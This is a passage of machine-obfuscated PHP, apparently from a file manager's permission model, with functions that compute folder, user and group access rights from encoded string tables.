$Şí€µšú; } $this->where(array($¬èŞïç[420] => array($¬èŞïç[421], $õ„ƒ§†’)))->delete(); return !0; } public function getAllChildren($ÄÕŞè) { $ìİ Ò¹‡ =& $_SERVER[Æ š¦İÈ]; $‚ÈµÂÒŒ = Model($ìİ Ò¹‡[1316])->sourceInfo($ÄÕŞè); if ($‚ÈµÂÒŒ[$ìİ Ò¹‡[413]] != $ìİ Ò¹‡[89]) { return $this->sourceListAuth(array($ÄÕŞè)); } if ($‚ÈµÂÒŒ[$ìİ Ò¹‡[414]] != SourceModel::TYPE_GROUP) { return array(); } $Î£¥”üÂ = 1; $‡è¤³˜ = array($ÄÕŞè); if ($‚ÈµÂÒŒ[$ìİ Ò¹‡[500]] == $ìİ Ò¹‡[192] && $‚ÈµÂÒŒ[$ìİ Ò¹‡[506]] != $Î£¥”üÂ) { $‡è¤³˜ = $this->groupChidldAllRootSource($‚ÈµÂÒŒ[$ìİ Ò¹‡[506]]); } $Å•À­Á = $this->field($ìİ Ò¹‡[405])->group($ìİ Ò¹‡[405])->select(); $Å•À­Á = array_to_keyvalue($Å•À­Á, $ìİ Ò¹‡[12], $ìİ Ò¹‡[405]); if (!$Å•À­Á) { return array(); } $È¼å£Åú = $ìİ Ò¹‡[1986]; $Û€ÀÇêì = array($ìİ Ò¹‡[405] => array($ìİ Ò¹‡[7], $Å•À­Á), $ìİ Ò¹‡[433] => $ìİ Ò¹‡[192]); $Ê×˜ËÄà = Model($ìİ Ò¹‡[822])->field($È¼å£Åú)->where($Û€ÀÇêì)->select(); $¼èêÛ­± = array($ÄÕŞè); foreach ($Ê×˜ËÄà as $Ç¦úÉÆí) { foreach ($‡è¤³˜ as $©¥Û¬©¼) { $˜ü÷İ§¨ = $ìİ Ò¹‡[50] . $©¥Û¬©¼ . $ìİ Ò¹‡[50]; $˜Ÿ¨Áä€ = $Ç¦úÉÆí[$ìİ Ò¹‡[523]] . $Ç¦úÉÆí[$ìİ Ò¹‡[405]] . $ìİ Ò¹‡[50]; if (strstr($˜Ÿ¨Áä€, $˜ü÷İ§¨)) { $¼èêÛ­±[] = $Ç¦úÉÆí[$ìİ Ò¹‡[405]]; break; } } } return $this->sourceListAuth($¼èêÛ­±); } private function sourceListAuth($¸Ìİ¨ğ‡) { $İöù™ç =& $_SERVER[Æ š¦İÈ]; $ú‹‡•š¼ = Model($İöù™ç[1316])->sourceListInfo($¸Ìİ¨ğ‡, !0); $‡Ğæ¶™Â = $this->sourceAuthSelect($¸Ìİ¨ğ‡); $×€ÓÂÇ— = array(); $áœ‘Ù²ğ = array(); foreach ($ú‹‡•š¼ as $àõÚÅÃÙ) { unset($àõÚÅÃÙ[$İöù™ç[456]]); unset($àõÚÅÃÙ[$İöù™ç[454]]); unset($àõÚÅÃÙ[$İöù™ç[416]]); unset($àõÚÅÃÙ[$İöù™ç[87]]); $û›ŞÓš = $‡Ğæ¶™Â[$àõÚÅÃÙ[$İöù™ç[405]]]; if (!$û›ŞÓš) { continue; } $àõÚÅÃÙ[$İöù™ç[1987]] = $this->authTargetInfo($û›ŞÓš); $àõÚÅÃÙ[$İöù™ç[521]] = rtrim($àõÚÅÃÙ[$İöù™ç[527]], $İöù™ç[8]) . $İöù™ç[8] . ltrim($àõÚÅÃÙ[$İöù™ç[521]], $İöù™ç[8]); $×€ÓÂÇ—[] = $àõÚÅÃÙ; $ğ˜šÙá = count(explode($İöù™ç[8], trim($àõÚÅÃÙ[$İöù™ç[521]], $İöù™ç[8]))); $áœ‘Ù²ğ[] = $ğ˜šÙá + ($àõÚÅÃÙ[$İöù™ç[33]] == $İöù™ç[79] ? 0 : 1000); } array_multisort($áœ‘Ù²ğ, SORT_ASC, $×€ÓÂÇ—); return $×€ÓÂÇ—; } private function groupChidldAllRootSource($Ñ·‚†‘¶) { $²î¿İÎü =& $_SERVER[Æ š¦İÈ]; $¦º“ô«— = Model($²î¿İÎü[1988])->groupChildrenAll($Ñ·‚†‘¶); $ö¶è†ãı = array($²î¿İÎü[500] => 0, $²î¿İÎü[506] => array($²î¿İÎü[7], $¦º“ô«—), $²î¿İÎü[414] => SourceModel::TYPE_GROUP); $ÀÉ·®¦õ = Model($²î¿İÎü[822])->field($²î¿İÎü[405])->where($ö¶è†ãı)->select(); $ÀÉ·®¦õ = array_to_keyvalue($ÀÉ·®¦õ, $²î¿İÎü[12], $²î¿İÎü[405]); return $ÀÉ·®¦õ; } private function authTargetInfo($©™¬ÑÀß) { $Ì ¹¥·… =& $_SERVER[Æ š¦İÈ]; $å¼Ş½… = array(); $Ÿ±Êîë˜ = array(); $íœ‡Ûßˆ = 2 << 25; foreach ($©™¬ÑÀß as $ÛûÆõšƒ) { $‚’İ±ñ = Model($Ì ¹¥·…[509])->listData($ÛûÆõšƒ[$Ì ¹¥·…[1913]]); if (!$‚’İ±ñ) { continue; } if ($ÛûÆõšƒ[$Ì ¹¥·…[414]] == SourceModel::TYPE_USER) { $…ª÷ò = Model($Ì ¹¥·…[515])->getInfoSimpleOuter($ÛûÆõšƒ[$Ì ¹¥·…[506]]); if ($…ª÷ò[$Ì ¹¥·…[1644]] == $Ì ¹¥·…[1179]) { continue; } if ($…ª÷ò[$Ì ¹¥·…[1644]] == $Ì ¹¥·…[192]) { $…ª÷ò[$Ì ¹¥·…[32]] = LNG($Ì ¹¥·…[1989]); } } else { $…ª÷ò = Model($Ì ¹¥·…[524])->getInfoSimple($ÛûÆõšƒ[$Ì ¹¥·…[506]]); } if (!$…ª÷ò) { continue; } $…ª÷ò[$Ì ¹¥·…[468]] = $‚’İ±ñ; $å¼Ş½…[] = $…ª÷ò; $ç‰àÉĞ = 0; if ($ÛûÆõšƒ[$Ì ¹¥·…[414]] == SourceModel::TYPE_GROUP) { $ç‰àÉĞ = $íœ‡Ûßˆ * 2; } if ($ÛûÆõšƒ[$Ì ¹¥·…[414]] == SourceModel::TYPE_USER) { $ç‰àÉĞ = $íœ‡Ûßˆ; } if ($ÛûÆõšƒ[$Ì ¹¥·…[414]] == SourceModel::TYPE_USER && $ÛûÆõšƒ[$Ì ¹¥·…[506]] == $Ì ¹¥·…[192]) { $ç‰àÉĞ = 0; } $Ÿ±Êîë˜[] = $‚’İ±ñ[$Ì ¹¥·…[416]] + $ç‰àÉĞ; } array_multisort($Ÿ±Êîë˜, SORT_DESC, $å¼Ş½…); return $å¼Ş½…; } public function getAllChildrenByUser($±†´ÅÍ¦, $£âùËˆ) { $¾Êµ¸¿¯ =& $_SERVER[Æ š¦İÈ]; $ŸÉ˜È’ğ = Model($¾Êµ¸¿¯[540])->getInfo($£âùËˆ); if (!$£âùËˆ || !$±†´ÅÍ¦ || !$ŸÉ˜È’ğ) { return array(); } $¶äªŠÚ¥ = Model($¾Êµ¸¿¯[1316])->sourceInfo($±†´ÅÍ¦); $˜ú¬ôäâ = array(); $ÒÓÄÎû’ = 1; if ($¶äªŠÚ¥[$¾Êµ¸¿¯[500]] == $¾Êµ¸¿¯[192] && $¶äªŠÚ¥[$¾Êµ¸¿¯[506]] != $ÒÓÄÎû’ && $this->groupContainUser($¶äªŠÚ¥[$¾Êµ¸¿¯[506]], $£âùËˆ)) { foreach ($ŸÉ˜È’ğ[$¾Êµ¸¿¯[1990]] as $€ïº‚¡”) { $£™ƒ±†ì = Model($¾Êµ¸¿¯[524])->getInfo($€ïº‚¡”[$¾Êµ¸¿¯[1812]]); $£·éÊ½ê = Model($¾Êµ¸¿¯[540])->getInfoSimpleOuter($£âùËˆ); $£·éÊ½ê[$¾Êµ¸¿¯[468]] = $€ïº‚¡”[$¾Êµ¸¿¯[416]]; if (Model($¾Êµ¸¿¯[509])->authCheckAction($€ïº‚¡”[$¾Êµ¸¿¯[416]][$¾Êµ¸¿¯[416]], $¾Êµ¸¿¯[1832])) { continue; } $¡“•ÁæÒ = array($¾Êµ¸¿¯[32] => $¾Êµ¸¿¯[1593] . $£™ƒ±†ì[$¾Êµ¸¿¯[32]], $¾Êµ¸¿¯[405] => $£™ƒ±†ì[$¾Êµ¸¿¯[87]][$¾Êµ¸¿¯[405]], $¾Êµ¸¿¯[78] => KodIO::make($£™ƒ±†ì[$¾Êµ¸¿¯[87]][$¾Êµ¸¿¯[405]]), $¾Êµ¸¿¯[500] => $¾Êµ¸¿¯[192], $¾Êµ¸¿¯[414] => $¾Êµ¸¿¯[517], $¾Êµ¸¿¯[33] => $¾Êµ¸¿¯[550], $¾Êµ¸¿¯[521] => $£™ƒ±†ì[$¾Êµ¸¿¯[528]], $¾Êµ¸¿¯[1812] => $£™ƒ±†ì[$¾Êµ¸¿¯[1812]], $¾Êµ¸¿¯[525] => $£™ƒ±†ì[$¾Êµ¸¿¯[500]], $¾Êµ¸¿¯[1987] => array($£·éÊ½ê)); $˜ú¬ôäâ[$¡“•ÁæÒ[$¾Êµ¸¿¯[405]]] = $¡“•ÁæÒ; } } $½şÎâê = array(); $„³ª¯¡ï = $this->getAllChildren($±†´ÅÍ¦); foreach ($„³ª¯¡ï as $ÍÓºıƒ) { $ç¿ÅÏ£ = !1; foreach ($ÍÓºıƒ[$¾Êµ¸¿¯[1987]] as $ú§Í¯¨¢) { if ($ú§Í¯¨¢[$¾Êµ¸¿¯[1644]]) { if ($ú§Í¯¨¢[$¾Êµ¸¿¯[1644]] == $£âùËˆ) { $ç¿ÅÏ£ = !0; break; } } if ($ú§Í¯¨¢[$¾Êµ¸¿¯[1812]]) { if ($this->groupContainUser($ú§Í¯¨¢[$¾Êµ¸¿¯[1812]], $£âùËˆ)) { $ç¿ÅÏ£ = !0; break; } } } if ($ç¿ÅÏ£) { $½şÎâê[] = $ÍÓºıƒ; } $ƒ°¤¶­ğ = $ÍÓºıƒ[$¾Êµ¸¿¯[405]]; if (isset($˜ú¬ôäâ[$ƒ°¤¶­ğ])) { $ÍÓºıƒ[$¾Êµ¸¿¯[1987]][] = $˜ú¬ôäâ[$ƒ°¤¶­ğ][0]; $˜ú¬ôäâ[$ƒ°¤¶­ğ] = !1; } } $˜ú¬ôäâ = array_filter(array_values($˜ú¬ôäâ)); $½şÎâê = array_merge($˜ú¬ôäâ, $½şÎâê); return $½şÎâê; } public function setAllChildrenByUser($­Õ‘ã¸, $”¯ÊÙÊ¤, $‚¥­–Ô”) { $Âó³øúŒ =& $_SERVER[Æ š¦İÈ]; $Œ‰Ò¶º¥ = $this->getAllChildrenByUser($­Õ‘ã¸, $”¯ÊÙÊ¤); if (!$‚¥­–Ô” || !$Œ‰Ò¶º¥) { return !1; } foreach ($Œ‰Ò¶º¥ as $­ Ù¶àë) { $Øš®¸ € = array(); foreach ($­ Ù¶àë[$Âó³øúŒ[1987]] as $ÊÁ“Ö­¤) { $ªªù²„Ÿ = $ÊÁ“Ö­¤[$Âó³øúŒ[468]]; $›¯¶ìÚˆ = $ÊÁ“Ö­¤[$Âó³øúŒ[1644]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Á¬È£¬ğ = $ÊÁ“Ö­¤[$Âó³øúŒ[1644]] ? $ÊÁ“Ö­¤[$Âó³øúŒ[1644]] : $ÊÁ“Ö­¤[$Âó³øúŒ[1812]]; if ($ÊÁ“Ö­¤[$Âó³øúŒ[1644]] && $ÊÁ“Ö­¤[$Âó³øúŒ[1644]] == $”¯ÊÙÊ¤) { continue; } $Øš®¸ €[] = array($Âó³øúŒ[405] => $­ Ù¶àë[$Âó³øúŒ[405]], $Âó³øúŒ[414] => $›¯¶ìÚˆ, $Âó³øúŒ[506] => intval($Á¬È£¬ğ), $Âó³øúŒ[1913] => isset($ªªù²„Ÿ[$Âó³øúŒ[403]]) ? intval($ªªù²„Ÿ[$Âó³øúŒ[403]]) : 0, $Âó³øúŒ[1967] => isset($ªªù²„Ÿ[$Âó³øúŒ[1967]]) ? intval($ªªù²„Ÿ[$Âó³øúŒ[1967]]) : -1); } $Øš®¸ €[] = array($Âó³øúŒ[405] => $­ Ù¶àë[$Âó³øúŒ[405]], $Âó³øúŒ[414] => SourceModel::TYPE_USER, $Âó³øúŒ[506] => intval($”¯ÊÙÊ¤), $Âó³øúŒ[1913] => intval($‚¥­–Ô”), $Âó³øúŒ[1967] => -1); $this->where(array($Âó³øúŒ[420] => $­ Ù¶àë[$Âó³øúŒ[405]]))->delete(); $this->addAll($Øš®¸ €); } return !0; } public function get($×î†§óó) { $¸¯©ñÜ = $this->getSourceList(array($×î†§óó), !0); return $¸¯©ñÜ[0]; } public function getSourceList($ëÓ«Õ®µ, $Öûé™Ù§ = false, $˜ä×üîë = false) { $£Ş„ñÑ =& $_SERVER[Æ š¦İÈ]; if (!$ëÓ«Õ®µ) { return array(); } $£ÄŒ°¡ = Model($£Ş„ñÑ[1316]); if (!$Öûé™Ù§ && count($ëÓ«Õ®µ) == 1) { $Öûé™Ù§ = array(); $Öûé™Ù§[$ëÓ«Õ®µ[0]] = $£ÄŒ°¡->sourceInfo($ëÓ«Õ®µ[0]); } if (!$Öûé™Ù§) { $ÏÙ¸‚îÈ = array($£Ş„ñÑ[420] => array($£Ş„ñÑ[421], $ëÓ«Õ®µ)); $Öûé™Ù§ = $£ÄŒ°¡->field($£Ş„ñÑ[1991])->where($ÏÙ¸‚îÈ)->select(); $Öûé™Ù§ = array_to_keyvalue($Öûé™Ù§, $£Ş„ñÑ[405]); } $ï€ğà÷ı = $ëÓ«Õ®µ; foreach ($Öûé™Ù§ as $²Ï×ôöá => $¢À½›úÆ) { $ØĞàºé = $£ÄŒ°¡->parentLevelArray($¢À½›úÆ[$£Ş„ñÑ[523]]); $ï€ğà÷ı = array_merge($ï€ğà÷ı, array($²Ï×ôöá), array_reverse($ØĞàºé)); } $ï€ğà÷ı = array_values(array_unique($ï€ğà÷ı)); if (!$ï€ğà÷ı) { return array(); } $¸´¶Ôñ = $this->sourceAuthSelect($ï€ğà÷ı); $¸’Ğôû = array(); foreach ($ï€ğà÷ı as $îâ£™Œ‘) { if (isset($¸´¶Ôñ[$îâ£™Œ‘])) { $¸’Ğôû[$îâ£™Œ‘] = $¸´¶Ôñ[$îâ£™Œ‘]; } } $ûØêÉÊÑ = $this->userIsRoot($˜ä×üîë); $°º—®—ğ = AuthModel::authAll(); $­í¸¤¿Ë = array($£Ş„ñÑ[417] => $°º—®—ğ, $£Ş„ñÑ[1992] => array($£Ş„ñÑ[422] => 0, $£Ş„ñÑ[1818] => $°º—®—ğ, $£Ş„ñÑ[423] => LNG($£Ş„ñÑ[1993]), $£Ş„ñÑ[1834] => $£Ş„ñÑ[1994])); $¹Â‰õğÊ = array(); foreach ($Öûé™Ù§ as $îâ£™Œ‘ => $ô˜Ø­Ò) { if ($ûØêÉÊÑ) { $¹Â‰õğÊ[$îâ£™Œ‘] = $­í¸¤¿Ë; continue; } $¹Â‰õğÊ[$îâ£™Œ‘] = $this->makeSourceAuth($ô˜Ø­Ò, $¸’Ğôû, $˜ä×üîë); } return $¹Â‰õğÊ; } public function authDeepCheck($Ñ„¤á¼, $íİÏÆˆ = false) { $ßò‹îÎ· =& $_SERVER[Æ š¦İÈ]; $íİÏÆˆ = $íİÏÆˆ ? $íİÏÆˆ : USER_ID; $”­ÆŠÌ× = $this->makeAuthDeep($íİÏÆˆ); if (!in_array($Ñ„¤á¼, $”­ÆŠÌ×[$ßò‹îÎ·[1995]])) { return !1; } $Š¾›ÃÆ = array(); foreach ($”­ÆŠÌ×[$ßò‹îÎ·[1996]] as $¼¢û¿…í => $ôğŞËªø) { if (!in_array($Ñ„¤á¼, $ôğŞËªø)) { continue; } $Š¾›ÃÆ[] = $¼¢û¿…í; } if (!$Š¾›ÃÆ) { return !1; } $åÖ‚²Ş = $Š¾›ÃÆ ? $Š¾›ÃÆ[0] : $Ñ„¤á¼; return array($ßò‹îÎ·[417] => -1, $ßò‹îÎ·[468] => array($ßò‹îÎ·[422] => $ßò‹îÎ·[1179], $ßò‹îÎ·[1818] => $ßò‹îÎ·[192], $ßò‹îÎ·[423] => LNG($ßò‹îÎ·[1997]), $ßò‹îÎ·[1834] => $ßò‹îÎ·[1998]), $ßò‹îÎ·[1999] => LNG($ßò‹îÎ·[2000]), $ßò‹îÎ·[2001] => $this->sourceAuthInfo($åÖ‚²Ş)); } protected function makeAuthDeep($€â€Öí = false) { $Øœ”Îİ¶ =& $_SERVER[Æ š¦İÈ]; static $òú×ÛÖ  = array(); $€â€Öí = $€â€Öí ? $€â€Öí : USER_ID; if (isset($òú×ÛÖ [$€â€Öí])) { return $òú×ÛÖ [$€â€Öí]; } $Ã˜£ò×ª = Model($Øœ”Îİ¶[2002])->listData(); $®Óô¼é = array(); foreach ($Ã˜£ò×ª as $è°Ûğæ) { if ($è°Ûğæ[$Øœ”Îİ¶[416]] == 0 && $è°Ûğæ[$Øœ”Îİ¶[1833]] == $Øœ”Îİ¶[89]) { $®Óô¼é[] = $è°Ûğæ[$Øœ”Îİ¶[403]]; } } $ß«š»É© = $this->userGroupParents($€â€Öí); $È±òŞÌÓ = array($Øœ”Îİ¶[414] => SourceModel::TYPE_USER, $Øœ”Îİ¶[506] => $€â€Öí); if ($ß«š»É©) { $È±òŞÌÓ = array(array($Øœ”Îİ¶[414] => SourceModel::TYPE_USER, $Øœ”Îİ¶[506] => $€â€Öí), array($Øœ”Îİ¶[414] => SourceModel::TYPE_GROUP, $Øœ”Îİ¶[506] => array($Øœ”Îİ¶[421], $ß«š»É©)), $Øœ”Îİ¶[991] => $Øœ”Îİ¶[1907]); } $ä™Èªî = $this->field($Øœ”Îİ¶[2003])->where($È±òŞÌÓ)->select(); $…«ÚóÉ = array(); $æ½ØÂô¯ = array_to_keyvalue_group($ä™Èªî, $Øœ”Îİ¶[405]); foreach ($æ½ØÂô¯ as $‰Õ€Ü›ø => $„Ú¤œ§”) { $“Æö’é´ = $this->authArrayCheck($„Ú¤œ§”, $€â€Öí); if ($“Æö’é´[$Øœ”Îİ¶[417]] > 0) { $…«ÚóÉ[] = $‰Õ€Ü›ø . $Øœ”Îİ¶[12]; } } if ($ß«š»É©) { $µ½ïÒ¬  = Model($Øœ”Îİ¶[524]); foreach ($ß«š»É© as $ı¼Ñëì) { $¶İ°ˆ·– = $µ½ïÒ¬ ->getInfo($ı¼Ñëì); if (!$¶İ°ˆ·– || !is_array($¶İ°ˆ·–[$Øœ”Îİ¶[87]])) { continue; } $…«ÚóÉ[] = $¶İ°ˆ·–[$Øœ”Îİ¶[87]][$Øœ”Îİ¶[405]]; } } $Ÿ×Î¥”Ğ = array(); $ìÅşİ° = $ß«š»É©; $ôŠÑ® = Model($Øœ”Îİ¶[1316]); $µ½ïÒ¬  = Model($Øœ”Îİ¶[524]); $†øĞƒ–Ó = array(); $‡´ë¨íŸ = array(); $Àæç±¡Â = array(); $©è³ı‹‘ = array(); if ($…«ÚóÉ) { $Ò˜ã”‰Ó = $ôŠÑ®->where(array($Øœ”Îİ¶[405] => array($Øœ”Îİ¶[421], $…«ÚóÉ)))->select(); foreach ($Ò˜ã”‰Ó as $Ğ«Â®) { $ø±à·„• = $ôŠÑ®->parentLevelArray($Ğ«Â®[$Øœ”Îİ¶[523]]); $Ÿ×Î¥”Ğ = array_merge($Ÿ×Î¥”Ğ, $ø±à·„•); $ìÅşİ°[] = $Ğ«Â®[$Øœ”Îİ¶[506]]; $†øĞƒ–Ó[$Ğ«Â®[$Øœ”Îİ¶[405]]] = $ø±à·„•; $‡´ë¨íŸ[$Ğ«Â®[$Øœ”Îİ¶[405]]] = $Ğ«Â®[$Øœ”Îİ¶[506]]; } } $ìÅşİ° = array_values(array_unique($ìÅşİ°)); $ñ¸Š´Êà = $ìÅşİ°; foreach ($ñ¸Š´Êà as $ı¼Ñëì) { $¶İ°ˆ·– = $µ½ïÒ¬ ->getInfo($ı¼Ñëì); $ø±à·„• = $ôŠÑ®->parentLevelArray($¶İ°ˆ·–[$Øœ”Îİ¶[523]]); $ìÅşİ° = array_merge($ìÅşİ°, $ø±à·„•); } $ìÅşİ° = array_values(array_unique($ìÅşİ°)); foreach ($ìÅşİ° as $ı¼Ñëì) { $¶İ°ˆ·– = $µ½ïÒ¬ ->getInfo($ı¼Ñëì); $Ÿ×Î¥”Ğ[] = $¶İ°ˆ·–[$Øœ”Îİ¶[87]][$Øœ”Îİ¶[405]]; $Àæç±¡Â[$ı¼Ñëì] = $¶İ°ˆ·–[$Øœ”Îİ¶[87]][$Øœ”Îİ¶[405]]; $©è³ı‹‘[$ı¼Ñëì] = $ôŠÑ®->parentLevelArray($¶İ°ˆ·–[$Øœ”Îİ¶[523]]); } foreach ($†øĞƒ–Ó as $Ç¹îæÌÀ => $œØãÁÖ¬) { $È×æµúŒ = $‡´ë¨íŸ[$Ç¹îæÌÀ]; if (!$È×æµúŒ || !$Àæç±¡Â[$È×æµúŒ]) { continue; } $‚ÅÆ­êÄ = array(); foreach ($©è³ı‹‘[$È×æµúŒ] as $ı¼Ñëì) { $‚ÅÆ­êÄ[] = $Àæç±¡Â[$ı¼Ñëì]; } $†øĞƒ–Ó[$Ç¹îæÌÀ] = array_merge($‚ÅÆ­êÄ, $œØãÁÖ¬); } $Ÿ×Î¥”Ğ = array_values(array_unique($Ÿ×Î¥”Ğ)); $ÊÒØ©ï“ = array($Øœ”Îİ¶[1995] => $Ÿ×Î¥”Ğ, $Øœ”Îİ¶[1996] => $†øĞƒ–Ó); $òú×ÛÖ [$€â€Öí] = $ÊÒØ©ï“; return $ÊÒØ©ï“; } private function makeSourceAuth($À™¾îÚÛ, $õÓ·¼¥ğ, $ŞŸôÈ¢ = false) { $å¹ü‹Åò =& $_SERVER[Æ š¦İÈ]; $ê–‚£‘è = $å¹ü‹Åò[89]; $ÀÁ ğë£ = $À™¾îÚÛ[$å¹ü‹Åò[506]]; $ÃÂš²ÄÍ = $À™¾îÚÛ[$å¹ü‹Åò[414]] == SourceModel::TYPE_GROUP; $±¯—Œçù = $ÃÂš²ÄÍ ? $this->groupRootAuth($ÀÁ ğë£, $ŞŸôÈ¢) : !1; if ($±¯—Œçù && Model($å¹ü‹Åò[509])->authCheckAction($±¯—Œçù[$å¹ü‹Åò[416]], $å¹ü‹Åò[1832])) { return $this->groupAuthInfo($±¯—Œçù, $ÀÁ ğë£); } $È¬´Ë÷ù = Model($å¹ü‹Åò[1316])->parentLevelArray($À™¾îÚÛ[$å¹ü‹Åò[523]]); $È¬´Ë÷ù = array_merge(array($À™¾îÚÛ[$å¹ü‹Åò[405]]), array_reverse($È¬´Ë÷ù)); $ŠéÖÉŞ = !1; foreach ($È¬´Ë÷ù as $Áäë¥ó¿) { if (!isset($õÓ·¼¥ğ[$Áäë¥ó¿])) { continue; } $¬‚ıÖ¢Œ = $this->authMake($õÓ·¼¥ğ[$Áäë¥ó¿], $ŞŸôÈ¢); if ($¬‚ıÖ¢Œ[$å¹ü‹Åò[468]]) { $ŠéÖÉŞ = $¬‚ıÖ¢Œ; break; } } if (!$ÃÂš²ÄÍ) { return $ŠéÖÉŞ; } if (!$ŠéÖÉŞ && $±¯—Œçù) { $ŠéÖÉŞ = $this->groupAuthInfo($±¯—Œçù, $ÀÁ ğë£); } if (!$ŠéÖÉŞ) { $Ù“ÖÈ‹ = Model($å¹ü‹Åò[524])->getInfo($ÀÁ ğë£); $ö¾”×ı = explode($å¹ü‹Åò[50], trim($Ù“ÖÈ‹[$å¹ü‹Åò[523]], $å¹ü‹Åò[50])); $ö¾”×ı = array_reverse($ö¾”×ı); foreach ($ö¾”×ı as $Ûùé¾Ã) { if ($Ûùé¾Ã == $å¹ü‹Åò[192] || $Ûùé¾Ã == $ê–‚£‘è) { continue; } $ª»¾°–– = $this->groupRootAuth($Ûùé¾Ã, $ŞŸôÈ¢); if (!$ª»¾°––) { continue; } $ŠéÖÉŞ = $this->groupAuthInfo($ª»¾°––, $Ûùé¾Ã); break; } } if (!$ŠéÖÉŞ || $ŠéÖÉŞ[$å¹ü‹Åò[417]] <= 0) { $‰Û¤– Ä = $this->authDeepCheck($À™¾îÚÛ[$å¹ü‹Åò[405]], $ŞŸôÈ¢); if ($‰Û¤– Ä) { $ŠéÖÉŞ = $‰Û¤– Ä; } } return $ŠéÖÉŞ; } private function userIsRoot($Ÿ¦æâõˆ = false) { $àÈÆ¹¬£ =& $_SERVER[Æ š¦İÈ]; if (!$Ÿ¦æâõˆ && _get($GLOBALS, $àÈÆ¹¬£[507])) { return !0; } $ºˆÂú®è = Model($àÈÆ¹¬£[540])->getInfo($Ÿ¦æâõˆ); $ó¥Îµîå = Model($àÈÆ¹¬£[2004])->listData($ºˆÂú®è[$àÈÆ¹¬£[1524]]); if ($ó¥Îµîå && $ó¥Îµîå[$àÈÆ¹¬£[513]][$àÈÆ¹¬£[2005]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ä‚°‘ó) { $´›å²ì =& $_SERVER[Æ š¦İÈ]; $Ù†¿ÅÔ½ = Model($´›å²ì[1316]); $âë”İüÚ = $Ù†¿ÅÔ½->sourceInfo($ä‚°‘ó); if (!$âë”İüÚ) { return !1; } $Ù†¿ÅÔ½->groupPathDisplay($âë”İüÚ); $üÅ£ÖÃ = array($âë”İüÚ); $üÅ£ÖÃ = $Ù†¿ÅÔ½->_listAppendPath($üÅ£ÖÃ); $âë”İüÚ = $üÅ£ÖÃ[0]; $ı®¦“ô· = $âë”İüÚ[$´›å²ì[521]]; if (isset($âë”İüÚ[$´›å²ì[529]])) { $êÛı‡„ù = explode($´›å²ì[8], trim($âë”İüÚ[$´›å²ì[521]], $´›å²ì[8])); array_shift($êÛı‡„ù); $ı®¦“ô· = $âë”İüÚ[$´›å²ì[527]] . $´›å²ì[2006] . implode($´›å²ì[8], $êÛı‡„ù); } return array($´›å²ì[423] => $âë”İüÚ[$´›å²ì[32]], $´›å²ì[78] => KodIO::make($âë”İüÚ[$´›å²ì[405]]), $´›å²ì[2007] => $ı®¦“ô·); } private function groupAuthInfo($•€ı¨á, $ÑİÅ¾óª) { $ğğ²ŒõÂ =& $_SERVER[Æ š¦İÈ]; $óıøÊåŒ = Model($ğğ²ŒõÂ[524])->getInfo($ÑİÅ¾óª); return array($ğğ²ŒõÂ[2008] => intval($•€ı¨á[$ğğ²ŒõÂ[416]]), $ğğ²ŒõÂ[1992] => $•€ı¨á, $ğğ²ŒõÂ[2009] => LNG($ğğ²ŒõÂ[2010]), $ğğ²ŒõÂ[2001] => array($ğğ²ŒõÂ[423] => $óıøÊåŒ[$ğğ²ŒõÂ[32]], $ğğ²ŒõÂ[78] => KodIO::make($óıøÊåŒ[$ğğ²ŒõÂ[87]][$ğğ²ŒõÂ[405]]), $ğğ²ŒõÂ[2007] => $óıøÊåŒ[$ğğ²ŒõÂ[528]])); } protected function groupRootAuth($øåàÃÜ, $šê°¡Âö = false) { $²ÈÇÄÅ¬ =& $_SERVER[Æ š¦İÈ]; $šê°¡Âö = $šê°¡Âö ? $šê°¡Âö : USER_ID; $ëùé’ÓÆ = $šê°¡Âö . $²ÈÇÄÅ¬[2011] . $øåàÃÜ; static $åËàÙÑ = array(); if (isset($åËàÙÑ[$ëùé’ÓÆ])) { return $åËàÙÑ[$ëùé’ÓÆ]; } $‡Ûğ£Ñ¦ = Model($²ÈÇÄÅ¬[524])->getInfo($øåàÃÜ); $İ¥şëÜ­ = $this->userGroupList($šê°¡Âö); $¼İ–ïš¥ = isset($İ¥şëÜ­[$øåàÃÜ]) ? $İ¥şëÜ­[$øåàÃÜ][$²ÈÇÄÅ¬[416]] : !1; if ($¼İ–ïš¥ && Model($²ÈÇÄÅ¬[509])->authCheckAction($¼İ–ïš¥[$²ÈÇÄÅ¬[416]], $²ÈÇÄÅ¬[1832])) { $åËàÙÑ[$ëùé’ÓÆ] = $¼İ–ïš¥; return $¼İ–ïš¥; } $ñ°š”Ú£ = $this->sourceAuthSelect($‡Ûğ£Ñ¦[$²ÈÇÄÅ¬[87]][$²ÈÇÄÅ¬[405]]); $¨ÎÖ®‚ = $ñ°š”Ú£ ? $this->authMake($ñ°š”Ú£, $šê°¡Âö) : !1; $“€Ë‚®œ = $¨ÎÖ®‚ ? $¨ÎÖ®‚[$²ÈÇÄÅ¬[468]] : !1; $åËàÙÑ[$ëùé’ÓÆ] = $“€Ë‚®œ ? $“€Ë‚®œ : $¼İ–ïš¥; return $åËàÙÑ[$ëùé’ÓÆ]; } public function authOwnerApply($àº›İ£Ñ) { $…ÃùÁøİ =& $_SERVER[Æ š¦İÈ]; if (empty($àº›İ£Ñ[$…ÃùÁøİ[416]]) || isset($àº›İ£Ñ[$…ÃùÁøİ[2012]]) && $àº›İ£Ñ[$…ÃùÁøİ[2012]]) { return $àº›İ£Ñ; } if (AuthModel::authCheckRoot($àº›İ£Ñ[$…ÃùÁøİ[416]][$…ÃùÁøİ[417]])) { return $àº›İ£Ñ; } $°ÌÄ‹î = Model($…ÃùÁøİ[1316])->parentLevelArray($àº›İ£Ñ[$…ÃùÁøİ[523]]); $°ÌÄ‹î = array_merge(array($àº›İ£Ñ[$…ÃùÁøİ[405]]), array_reverse($°ÌÄ‹î)); $¸ÕÑ·‹Ÿ = $this->sourceAuthSelect($°ÌÄ‹î); $—Šùã¨ø = array(); $§ı®ôêÚ = array(); foreach ($¸ÕÑ·‹Ÿ as $ü¸˜”’¢ => $ëËèÈìñ) { $¹ŸÃ›Óã = $this->authFolderOwnerUser($ëËèÈìñ); $—Šùã¨ø[$ü¸˜”’¢] = $¹ŸÃ›Óã; $§ı®ôêÚ = array_merge($§ı®ôêÚ, $¹ŸÃ›Óã[$…ÃùÁøİ[596]]); if ($¹ŸÃ›Óã[$…ÃùÁøİ[2013]]) { break; } } if (count($§ı®ôêÚ) == 0) { $§ı®ôêÚ = $this->authFolderOwnerGroup($àº›İ£Ñ[$…ÃùÁøİ[506]]); } $§ı®ôêÚ = array_unique($§ı®ôêÚ); if 